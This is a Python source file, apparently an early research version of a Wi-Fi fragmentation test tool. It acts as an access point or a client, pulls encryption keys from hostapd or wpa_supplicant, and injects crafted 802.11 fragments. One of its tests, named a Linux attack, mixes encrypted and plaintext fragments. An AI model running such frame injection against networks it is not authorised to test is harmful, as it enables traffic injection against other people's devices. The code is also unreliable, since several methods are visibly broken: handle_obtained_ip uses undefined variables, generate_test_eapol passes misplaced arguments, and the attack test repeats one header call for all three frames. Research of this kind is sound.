#!/usr/bin/env python3
from libwifi import *
import abc, sys, socket, struct, time, subprocess, atexit, select
from wpaspy import Ctrl
from scapy.contrib.wpa_eapol import WPA_key

# NOTES:
# - The ath9k_htc devices by default overwrite the injected sequence number.
#   However, this number is not incremented when the MoreFragments flag is set,
#   meaning we can inject fragmented frames (albeit with a different sequence
#   number than then one we use for injection this this script).
#   TODO: The above cannot be relied on when other frames and send between
#	  the two fragments?
# - Overwriting the sequence can be avoided by patching `ath_tgt_tx_seqno_normal`
#   and commenting out the two lines that modify `i_seq`.
# - See also the comment in Station.inject_next_frags to avoid other bugs with
#   ath9k_htc when injecting frames with the MF flag and while being in AP mode.

#MAC_STA2 = "d0:7e:35:d9:80:91"
#MAC_STA2 = "20:16:b9:b2:73:7a"
MAC_STA2 = "80:5a:04:d4:54:c4"

# ---------- Utility Commands ----------

def wpaspy_clear_messages(ctrl):
	# Clear old replies and messages from the hostapd control interface. This is not
	# perfect and there may be new unrelated messages after executing this code.
	while ctrl.pending():
		ctrl.recv()

def wpaspy_command(ctrl, cmd):
	wpaspy_clear_messages(ctrl)
	rval = ctrl.request(cmd)
	if "UNKNOWN COMMAND" in rval:
		log(ERROR, "wpa_supplicant did not recognize the command %s. Did you (re)compile wpa_supplicant?" % cmd.split()[0])
		quit(1)
	elif "FAIL" in rval:
		log(ERROR, "Failed to execute command %s" % cmd)
		quit(1)
	return rval

def argv_pop_argument(argument):
	if not argument in sys.argv: return False
	idx = sys.argv.index(argument)
	del sys.argv[idx]
	return True


class TestOptions():
	def __init__(self):
		self.test = None
		self.interface = None
		self.clientip = None
		self.routerip = None


class MetaFrag():
	# StartingAuth, AfterAuthRace
	# AfterObtainedIp: when we (AP) gave the client an IP. Or when we (client) got an IP.
	BeforeAuth, BeforeAuthDone, AfterAuth, AfterObtainedIp = range(4)

	def __init__(self, frag, trigger, encrypted, inc_pn=1):
		self.frag = frag
		self.trigger = trigger
		self.encrypted = encrypted
		self.inc_pn = inc_pn

class TestCase():
	"""Currently this is mainly to test ping replies"""
	def __init__(self):
		self.fragments = []

	def next_trigger_is(self, trigger):
		if len(self.fragments) == 0:
			return False
		return self.fragments[0].trigger == trigger

	def next(self):
		frag = self.fragments[0]
		del self.fragments[0]
		return frag

class Station():
	def __init__(self, daemon, mac, ds_status):
		self.daemon = daemon
		self.options = daemon.options
		self.txed_before_auth = False
		self.txed_before_auth_done = False
		self.obtained_ip = False

		self.tk = None
		# TODO: Get the current PN from the kernel, increment by 0x99,
		# and use that to inject packets. Causes less interference.
		# Though perhaps causing interference might be good...
		self.pn = 0x8000000
		self.gtk = None
		self.gtk_idx = None

		# Contains either the "to-DS" or "from-DS" flag.
		self.FCfield = Dot11(FCfield=ds_status).FCfield

		# MAC address and IP of the station that our script controls.
		# Can be either an AP or client.
		self.mac = mac
		self.ip = None

		# MAC address and IP of the peer station.
		# Can be either an AP or client.
		self.peermac = None
		self.peerip = None

		# To test frame forwarding to a 3rd party
		self.othermac = None
		self.otherip = None


	def handle_mon_rx(self, p):
		pass

	def handle_eth_rx(self, p):
		print(repr(p))

		# TODO: How to automatically determine a successfull test?
		# TODO XXX --- Make sure this is not a packet send by us!
		if ARP in p and p[ARP].pdst == self.ip:
			log(STATUS, "Received reply to (fragmented?) ARP request!", color="green")

	def set_header(self, p, forward=False, prior=None):
		"""Set addresses to send frame to the peer or the 3rd party station."""
		# Forward request only makes sense towards the DS/AP
		assert (not forward) or ((p.FCfield & 1) == 0)
		# Priority is only supported in data frames
		assert (prior == None) or (p.type == 2)

		p.FCfield |= self.FCfield
		if prior:
			p.subtype = 8
			p.add_payload(Dot11QoS(TID=prior))

		destmac = self.othermac if forward else self.peermac
		p.addr1 = self.peermac
		p.addr2 = self.mac
		# Here p.FCfield & 1 tests if to-DS is set. Then this fields
		# represents the final destination. Otherwise its the BSSID.
		p.addr3 = destmac if p.FCfield & 1 else self.mac

	def get_header(self, seqnum=0xAA, **kwargs):
		"""Generate a default common header that is frequently used"""
		header = Dot11(type="Data", SC=(seqnum << 4))
		self.set_header(header, **kwargs)
		return header

	def create_fragments(self, header, data, num_frags):
		data = raw(data)
		fragments = []
		fragsize = (len(data) + 1) // num_frags
		for i in range(num_frags):
			frag = header.copy()
			frag.SC |= i
			if i < num_frags - 1:
				frag.FCfield |= Dot11(FCfield="MF").FCfield

			payload = data[fragsize * i : fragsize * (i + 1)]
			frag = frag/Raw(payload)
			fragments.append(frag)

		return fragments

	def encrypt(self, frame, inc_pn=1):
		key, keyid = (self.tk, 0) if int(frame.addr1[1], 16) & 1 == 0 else (self.gtk, self.gtk_idx)
		encrypted = encrypt_ccmp(frame, key, self.pn, keyid)
		self.pn += inc_pn
		return encrypted

	def generate_test_arpping(self, trigger, num_frags=2):
		header = self.get_header()
		request = LLC()/SNAP()/ARP(op=1, hwsrc=self.mac, psrc=self.ip, hwdst=self.peermac, pdst=self.peerip)
		frags = self.create_fragments(header, request, num_frags)

		test = TestCase()
		for frag in frags:
			test.fragments.append(MetaFrag(frag, trigger, False))

		return test

	def generate_test_ping(self, trigger, num_frags=2):
		header = self.get_header()
		request = LLC()/SNAP()/IP(src=self.ip, dst=self.peerip)/ICMP()/Raw(b"generate_test_ping")
		frags = self.create_fragments(header, request, num_frags)

		test = TestCase()
		for frag in frags:
			test.fragments.append(MetaFrag(frag, trigger, True))

		return test

	def generate_test_eapol(self, num_bytes=16, num_frags=1):
		header = self.get_header()
		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
		frags = self.create_fragments(header, request, num_frags)

		test = TestCase()
		for frag in frags:
			test.fragments.append(MetaFrag(frag), MetaFrag.BeforeAuth, False)

		return test

	def generate_test_eapol_debug(self):
		"""Here we manually tweak things for ad-hoc tests"""

		header = self.get_header(prior=2)
		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
		frag1, frag2 = self.create_fragments(header, data=request, num_frags=2)

		frag1copy, frag2copy = self.create_fragments(header, data=request, num_frags=2)
		frag1copy.addr1 = "ff:ff:ff:ff:ff:ff"
		frag2copy.addr1 = "ff:ff:ff:ff:ff:ff"

		# To generate the tests we need to know the MAC and IP addresses

		test = TestCase()
		#test.fragments.append(MetaFrag(frag1, MetaFrag.BeforeAuthDone, False))
		#test.fragments.append(MetaFrag(frag2copy, MetaFrag.BeforeAuthDone, False))
		#test.fragments.append(MetaFrag(frag2copy, MetaFrag.AfterAuth, False))
		test.fragments.append(MetaFrag(header/LLC()/SNAP()/IP()/ICMP(), MetaFrag.AfterAuth, False))
		#test.fragments.append(MetaFrag(frag2, MetaFrag.AfterAuth, True))

		return test

	def generate_linux_attack(self):
		test = TestCase()
		seqnum = 0xAA

		# Frame 1: encrypted normal fragment
		frag1 = Dot11(type="Data", FCfield="MF", SC=(seqnum << 4) | 0)/Raw(b"A" * 16)
		self.set_header(frag1)
		test.fragments.append(MetaFrag(frag1, MetaFrag.AfterAuth, True))

		# Frame 2: encrypted fragment with different CS but incremental PN.
		#	   sent fragmented to prevent receiving from processing it.
		frag2 = Dot11(type="Data", SC=((seqnum ^ 1) << 4) | 1)/Raw(b"B" * 16)
		self.set_header(frag1)
		test.fragments.append(MetaFrag(frag2, MetaFrag.AfterAuth, True))

		# Frame 3: plaintext fragment with same CS as the first encrypted fragment
		frag3 = Dot11(type="Data", SC=(seqnum << 4) | 1)/Raw(b"C" * 16)
		self.set_header(frag1)
		test.fragments.append(MetaFrag(frag3, MetaFrag.AfterAuth, False))

		return test

	def generate_tests(self):
		#self.test = self.generate_test_arpping(MetaFrag.AfterObtainedIp)
		self.test = self.generate_test_ping(MetaFrag.AfterObtainedIp, num_frags=1)
		#self.text = self.generate_test_eapol()
		#self.test = self.generate_test_eapol_debug()
		#self.test = self.generate_linux_attack()
		#self.test = TestCase()

		# - Test case to check if the receiver supports interleaved priority
		#   reception. It seems Windows 10 / Intel might not support this.
		# - Test case with a very lage aggregated frame (which is normally not
		#   allowed but some may accept it). And a variation to check how APs
		#   will forward such overly large frame (e.g. force fragmentation).

		# 1. ============================================================
		# 1.1 Encrypted (= sanity ping test)
		# 1.2 Plaintext (= text plaintext injection)
		# 1.3 Encrpted, Encrypted
		# 1.4 [TKIP] Encrpted, Encrypted, no global MIC
		# 1.5 Plaintext, plaintext
		# 1.6 Encrypted, plaintext
		# 1.7 Plaintext, encrypted
		# 1.8 Encrypted, plaintext, encrypted
		# 1.9 Plaintext, encrypted, plaintext
		# 2. Test 2 but first plaintext sent before installing key

		log(STATUS, "Constructed test case")

	def set_peermac(self, peermac):
		self.peermac = peermac

	def handle_connecting(self, peermac):
		self.set_peermac(peermac)
		self.generate_tests()

	def inject_next_frags(self, trigger):
		frag = None

		while self.test.next_trigger_is(trigger):
			metafrag = self.test.next()
			if metafrag.encrypted:
				assert self.tk != None and self.gtk != None
				frag = self.encrypt(metafrag.frag, inc_pn=metafrag.inc_pn)
			else:
				frag = metafrag.frag
			self.daemon.inject_mon(frag)
			print("[Injected fragment]", repr(frag))

		# With ath9k_htc devices, there's a bug when injecting a frame with the
		# More Fragments (MF) field *and* operating the interface in AP mode
		# while the target is connected. For some reason, after injecting the
		# frame, it halts the transmission of all other normal frames (this even
		# includes beacons). Injecting a dummy packet like below avoid this,
		# and assures packets keep being sent normally (when the last fragment
		# had the MF flag set).
		if frag != None and frag.FCfield & 0x4 != 0:
			self.daemon.inject_mon(Dot11(addr1="ff:ff:ff:ff:ff:ff"))
			print("[Injected packet] Prevent ath9k_htc bug after fragment injection")

	def handle_eapol_tx(self, eapol):
		eapol = EAPOL(eapol)
		key_type   = eapol.key_info & 0x0008
		key_ack    = eapol.key_info & 0x0080
		key_mic    = eapol.key_info & 0x0100
		key_secure = eapol.key_info & 0x0200
		# Detect Msg3/4 assumig WPA2 is used --- XXX support WPA1 as well
		is_msg3_or_4 = key_secure != 0

		# Inject any fragments before authenticating
		if not self.txed_before_auth:
			log(STATUS, "MetaFrag.BeforeAuth", color="green")
			self.inject_next_frags(MetaFrag.BeforeAuth)
			self.txed_before_auth = True
		# Inject any fragments when almost done authenticating
		elif is_msg3_or_4 and not self.txed_before_auth_done:
			log(STATUS, "MetaFrag.BeforeAuthDone", color="green")
			self.inject_next_frags(MetaFrag.BeforeAuthDone)
			self.txed_before_auth_done = True

		# - Send over monitor interface to assure order compared to injected fragments.
		# - This is also important because the station might have already installed the
		#   key before this script can send the EAPOL frame over Ethernet.
		# - Send with high priority, otherwise MetaFrag.AfterAuth might be send before
		#   the EAPOL frame by the Wi-Fi chip.
		p = Dot11(type="Data", subtype=8)/Dot11QoS(TID=6)/LLC()/SNAP()/eapol
		self.set_header(p)
		if self.tk: p = self.encrypt(p)
		daemon.inject_mon(p)
		print(repr(p))

	def handle_authenticated(self):
		"""Called after completion of the 4-way handshake or similar"""

		log(STATUS, "MetaFrag.AfterAuth", color="green")
		self.tk = self.daemon.get_tk(self)
		self.gtk, self.gtk_idx = self.daemon.get_gtk()
		self.inject_next_frags(MetaFrag.AfterAuth)

	def set_ip_address(self, ip, peerip):
		self.ip = ip
		self.peerip = peerip

	def handle_obtained_ip(self):
		"""
		We are client: called when just authenticated to AP *and* IP addresses known.
		We are AP: called when client connected and requested IP.
		"""
		self.obtained_ip = True
		self.ip = ip
		self.peerip = peerip

		# XXX --- RECONNECT AND GENERATE TESTS ?????? XXX
		self.test = self.generate_test_ping(MetaFrag.AfterObtainedIp, num_frags=2)

		log(STATUS, "MetaFrag.AfterObtainedIp", color="green")
		self.inject_next_frags(MetaFrag.AfterObtainedIp)


class Daemon():
	def __init__(self, options):
		self.options = options

		# Note: some kernels don't support interface names of 15+ characters
		self.nic_iface = options.interface
		self.nic_mon = "mon" + self.nic_iface[:12]

		self.process = None
		self.sock_eth = None
		self.sock_mon = None

	@abc.abstractmethod
	def start_daemon(self):
		pass

	def configure_daemon(self):
		pass

	def handle_mon_rx(self, p):
		pass

	def handle_eth_rx(self, p):
		pass

	@abc.abstractmethod
	def get_tk(self, station):
		pass

	def get_gtk(self):
		gtk, idx = wpaspy_command(self.wpaspy_ctrl, "GET_GTK").split()
		return bytes.fromhex(gtk), int(idx)

	# TODO: Might be good to put this into libwifi?
	def configure_interfaces(self):
		log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")

		# 0. Some users may forget this otherwise
		subprocess.check_output(["rfkill", "unblock", "wifi"])

		# 1. Remove unused virtual interfaces to start from a clean state
		subprocess.call(["iw", self.nic_mon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

		# 2. Configure monitor mode on interfaces
		subprocess.check_output(["iw", self.nic_iface, "interface", "add", self.nic_mon, "type", "monitor"])
		# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
		# sequence of commands assures the virtual interface is properly registered as a 802.11 monitor interface.
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		time.sleep(0.5)
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		subprocess.check_output(["ifconfig", self.nic_mon, "up"])

	def inject_mon(self, p):
		self.sock_mon.send(p)

	def inject_eth(self, p):
		self.sock_eth.send(p)

	def run(self):
		self.configure_interfaces()
		self.start_daemon()
		self.sock_mon = MonitorSocket(type=ETH_P_ALL, iface=self.nic_mon)
		self.sock_eth = L2Socket(type=ETH_P_ALL, iface=self.nic_iface)

		# Open the wpa_supplicant or hostapd control interface
		try:
			self.wpaspy_ctrl = Ctrl("wpaspy_ctrl/" + self.nic_iface)
			self.wpaspy_ctrl.attach()
		except:
			log(ERROR, "It seems wpa_supplicant/hostapd did not start properly, please inspect its output.")
			log(ERROR, "Did you disable Wi-Fi in the network manager? Otherwise it won't start properly.")
			raise

		# Post-startup configuration of the supplicant or AP
		self.configure_daemon()

		# Monitor the virtual monitor interface of the client and perform the needed actions
		while True:
			sel = select.select([self.sock_mon, self.sock_eth, self.wpaspy_ctrl.s], [], [], 1)
			if self.sock_mon in sel[0]:
				p = self.sock_mon.recv()
				if p != None: self.handle_mon_rx(p)

			if self.sock_eth in sel[0]:
				p = self.sock_eth.recv()
				if p != None and Ether in p: self.handle_eth_rx(p)

			if self.wpaspy_ctrl.s in sel[0]:
				msg = self.wpaspy_ctrl.recv()
				self.handle_wpaspy(msg)

	def stop(self):
		log(STATUS, "Closing Hostap daemon and cleaning up ...")
		if self.process:
			self.process.terminate()
			self.process.wait()
		if self.sock_eth: self.sock_eth.close()
		if self.sock_mon: self.sock_mon.close()


class Authenticator(Daemon):
	def __init__(self, options):
		super().__init__(options)

		self.apmac = None
		self.sock_eth = None
		self.dhcp = None
		self.arp_sender_ip = None
		self.arp_sock = None
		self.stations = dict()

	def get_tk(self, station):
		tk = wpaspy_command(self.wpaspy_ctrl, "GET_TK " + station.peermac)
		return bytes.fromhex(tk)

	def handle_eth_rx(self, p):
		# Ignore clients not connected to the AP
		clientmac = p[Ether].src
		if not clientmac in self.stations:
			return

		# Let clients get IP addresses
		self.dhcp.reply(p)
		self.arp_sock.reply(p)

		# Raise event when client is assigned an IP address
		station = self.stations[clientmac]
		if DHCP in p and not station.obtained_ip and clientmac in self.dhcp.leases:
			req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')
			# This assures we only mark it was connected after receiving a DHCP Request
			if req_type == 3:
				# TODO: We should wait a bit until the peer received the DHCP Ack ...
				peerip = self.dhcp.leases[clientmac]
				log(STATUS, "Client %s with IP %s has connected" % (clientmac, peerip))
				station.handle_obtained_ip(self.arp_sender_ip, peerip)

		station.handle_eth_rx(p)

	def handle_wpaspy(self, msg):
		log(STATUS, "daemon: " + msg)

		if "AP-STA-CONNECTING" in msg:
			cmd, clientmac = msg.split()
			if not clientmac in self.stations:
				# Already pre-allocate an IP for this client
				clientip = self.dhcp.prealloc_ip(clientmac)

				station = Station(self, self.apmac, "from-DS")
				station.set_ip_address(self.arp_sender_ip, clientip)
				self.stations[clientmac] = station

			log(STATUS, "Client %s is connecting" % clientmac)
			station = self.stations[clientmac]
			station.handle_connecting(clientmac)

		elif "EAPOL-TX" in msg:
			cmd, clientmac, payload = msg.split()
			if not clientmac in self.stations:
				log(WARNING, "Sending EAPOL to unknown client %s." % clientmac)
				return
			self.stations[clientmac].handle_eapol_tx(bytes.fromhex(payload))

		elif "AP-STA-CONNECTED" in msg:
			cmd, clientmac = msg.split()
			if not clientmac in self.stations:
				log(WARNING, "Unknown client %s finished authenticating." % clientmac)
				return
			self.stations[clientmac].handle_authenticated()

	def start_daemon(self):
		log(STATUS, "Starting hostapd ...")
		try:
			self.process = subprocess.Popen([
				"../hostapd/hostapd",
				"-i", self.nic_iface,
				"hostapd.conf", "-dd"
			])
			time.sleep(1)
		except:
			if not os.path.exists("../hostapd/hostapd"):
				log(ERROR, "hostapd executable not found. Did you compile hostapd?")
			raise

		self.apmac = scapy.arch.get_if_hwaddr(self.nic_iface)

	def configure_daemon(self):
		# Intercept EAPOL packets that the client wants to send
		wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")

		# Let scapy handle DHCP requests
		self.dhcp = DHCP_sock(sock=self.sock_eth,
						domain='mathyvanhoef.com',
						pool=Net('192.168.100.0/24'),
						network='192.168.100.0/24',
						gw='192.168.100.254',
						renewal_time=600, lease_time=3600)
		# Configure gateway IP: reply to ARP and ping requests
		subprocess.check_output(["ifconfig", self.nic_iface, "192.168.100.254"])

		# Use a dedicated IP address for our ARP ping and replies
		self.arp_sender_ip = self.dhcp.pool.pop()
		self.arp_sock = ARP_sock(sock=self.sock_eth, IP_addr=self.arp_sender_ip, ARP_addr=self.apmac)
		log(STATUS, "Will inject ARP packets using sender IP %s" % self.arp_sender_ip)


class Supplicant(Daemon):
	def __init__(self, options):
		super().__init__(options)
		self.station = None
		self.arp_sock = None
		self.requesting_ip = True

	def get_tk(self, station):
		tk = wpaspy_command(self.wpaspy_ctrl, "GET tk")
		if tk == "none":
			raise Exception("Couldn't retrieve session key of client")
		else:
			return bytes.fromhex(tk)

	def send_dhcp_discover(self):
		rawmac = bytes.fromhex(self.station.mac.replace(':', ''))
		req = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.station.mac)/IP(src="0.0.0.0", dst="255.255.255.255")
		req = req/UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=1337)
		req = req/DHCP(options=[("message-type","discover"),"end"])
		self.sock_eth.send(req)

	def send_dhcp_reply(self, offer):
		rawmac = bytes.fromhex(self.station.mac.replace(':', ''))
		myip = offer[BOOTP].yiaddr
		sip = offer[BOOTP].siaddr
		xid = offer[BOOTP].xid

		reply = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.station.mac)/IP(src="0.0.0.0", dst="255.255.255.255")
		reply = reply/UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=1337)
		reply = reply/DHCP(options=[("message-type", "request"), ("server_id", sip), ("requested_addr", myip),
					    ("hostname", "fragclient"), "end"])
		self.sock_eth.send(reply)

	def handle_eth_rx_connect(self, p):
		"""Handle packets needed to connect and request an IP"""

		# Some functions here may update this variable, so save it locally
		requesting_ip = self.requesting_ip

		# Handle ARP requests once we have an IP
		if self.arp_sock:
			self.arp_sock.reply(p)

		# Check for DHCP response packets if not yet connected
		if DHCP in p and not self.station.obtained_ip:
			req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')

			# DHCP Offer
			if req_type == 2:
				self.send_dhcp_reply(p)

			# DHCP Ack
			elif req_type == 5:
				clientip = p[BOOTP].yiaddr
				serverip = p[IP].src
				self.arp_sock = ARP_sock(sock=self.sock_eth, IP_addr=self.station.ip, ARP_addr=self.station.mac)

				if requesting_ip:
					self.check_reconnect(clientip, serverip)
				else:
					self.station.handle_obtained_ip(clientip, serverip)

		return requesting_ip

	def handle_eth_rx(self, p):
		if not self.handle_eth_rx_connect(p):
			self.station.handle_eth_rx(p)

	def handle_wpaspy(self, msg):
		log(STATUS, "daemon: " + msg)

		if "CTRL-EVENT-CONNECTED" in msg:
			if self.requesting_ip:
				# TODO: Create a timer in case retransmissions are needed
				self.send_dhcp_discover()
			else:
				self.station.handle_authenticated()
				self.station.handle_obtained_ip()

		elif "Trying to authenticate with" in msg:
			p = re.compile("Trying to authenticate with (.*) \(SSID")
			peermac = p.search(msg).group(1)
			if self.requesting_ip:
				self.station.set_peermac(peermac)
			else:
				self.station.handle_connecting(peermac)

		elif not self.requesting_ip and "EAPOL-TX" in msg:
			cmd, srcaddr, payload = msg.split()
			self.station.handle_eapol_tx(bytes.fromhex(payload))

	def check_reconnect(self, clientip, serverip):
		if not self.requesting_ip:
			return

		self.requesting_ip = False
		self.station.set_ip_address(clientip, serverip)

		# TODO: Check that ROAM command always performs a deauthentication
		log(STATUS, "Obtained IP address, will now reconnect.", color="green")
		wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")
		wpaspy_command(self.wpaspy_ctrl, "ROAM " + self.station.peermac)

	def configure_daemon(self):
		# TODO: Only enable networks once our script is ready, to prevent
		#	wpa_supplicant from connecting before our start started.

		# If the user already supplied IPs we can immediately perform tests
		if self.options.clientip and self.options.routerip:
			self.requesting_ip = False
			self.station.set_ip_address(self.options.clientip, self.options.routerip)
			wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")

		# Otherwise we first request an IP using DHCP and then reconnect
		else:
			self.requesting_ip = True
		time.sleep(5)

	def start_daemon(self):
		log(STATUS, "Starting wpa_supplicant ...")
		try:
			self.process = subprocess.Popen([
				"../wpa_supplicant/wpa_supplicant",
				"-Dnl80211",
				"-i", self.nic_iface,
				"-cclient.conf",
				"-dd"])
			time.sleep(1)
		except:
			if not os.path.exists("../wpa_supplicant/wpa_supplicant"):
				log(ERROR, "wpa_supplicant executable not found. Did you compile wpa_supplicant?")
			raise

		clientmac = scapy.arch.get_if_hwaddr(self.nic_iface)
		self.station = Station(self, clientmac, "to-DS")


def cleanup():
	daemon.stop()


if __name__ == "__main__":
	if "--help" in sys.argv or "-h" in sys.argv:
		print("\nSee README.md for usage instructions.")
		quit(1)

	options = TestOptions()
	options.interface = sys.argv[1]
	# options.test = TestOptions.Inject_Ping

	# Parse remaining options
	start_ap = argv_pop_argument("--ap")
	while argv_pop_argument("--debug"):
		libwifi.global_log_level -= 1

	# Now start the tests
	if start_ap:
		daemon = Authenticator(options)
	else:
		daemon = Supplicant(options)
	atexit.register(cleanup)
	daemon.run()

